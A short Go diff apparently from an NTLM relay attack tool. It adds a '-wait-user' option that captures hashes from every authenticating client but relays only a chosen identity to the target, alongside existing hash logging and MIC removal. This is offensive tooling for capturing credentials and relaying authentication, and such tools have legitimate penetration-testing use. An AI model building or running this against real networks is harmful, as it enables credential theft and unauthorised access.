@@ -379,6 +379,16 @@ func handleAuth(auth AuthResult, cfg *Config) {
 		logCapturedHash(hash, cfg.OutputFile)
 	}
 
+	// -wait-user: only relay the wanted identity. Decline everyone else
+	// (hashes already captured above) without touching the target, and do not
+	// count it as a failure — the target stays available until the wanted
+	// identity authenticates.
+	if !cfg.IdentityWanted(identity) {
+		verboseLog("[-] Waiting for %s — declining relay for %s", cfg.WaitUser, identity)
+		auth.ResultCh <- false
+		return
+	}
+
 	// Apply NTLM manipulation to Type 3
 	if cfg.RemoveMIC {
 		type3 = removeMIC(type3)
